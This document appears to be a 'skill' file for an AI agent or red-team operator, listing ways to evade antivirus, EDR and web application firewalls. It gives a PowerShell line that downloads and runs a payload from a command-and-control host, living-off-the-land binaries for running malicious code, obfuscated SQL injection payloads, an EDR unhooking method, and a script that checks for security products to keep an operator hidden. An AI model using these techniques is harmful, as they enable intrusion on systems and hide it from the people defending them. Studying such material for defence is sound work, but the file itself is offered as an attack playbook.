# SKILL: OPSEC & EVASION

## Description
Techniques for bypassing Anti-Virus (AV), Endpoint Detection and Response (EDR), and Web Application Firewalls (WAF) to maintain stealth during engagements.

## Techniques

### 1. In-Memory Execution (Windows)
Avoid dropping binaries to disk. Use .NET reflection or PowerShell memory injection.
- **Tool:** Invoke-ReflectivePEInjection, Donut.
- **Execution:** `IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')`

### 2. Living off the Land (LotL)
Utilize pre-installed system binaries to execute malicious code.
- **Windows:** `certutil.exe`, `bitsadmin.exe`, `msbuild.exe`, `regsvr32.exe`.
- **Linux:** `awk`, `perl`, `python`, `curl`, `wget`.

### 3. WAF Evasion (Web)
Mutating payloads to bypass signature-based web filters.
- **Techniques:** Case toggling (`SeLeCt`), URL encoding (`%53%45%4c%45%43%54`), Unicode normalization abuse, HTTP Parameter Pollution (HPP).
- **SQLi Example:** `/*!50000SELECT*/ * FROM users`

### 4. API Unhooking
Bypassing user-land EDR hooks by reloading fresh copies of `ntdll.dll` from disk to memory before executing shellcode.

## Automation Script: `check_edr.ps1`
```powershell
# Quick silent EDR check
$edr_processes = @("csagent", "cbstream", "sentinelagent", "traps", "bdservicehost", "sophos", "mssense")
$running = Get-Process | Select-Object -ExpandProperty Name
foreach ($edr in $edr_processes) {
    if ($running -match $edr) {
        Write-Output "[!] OPSEC ALERT: $edr detected."
    }
}
```
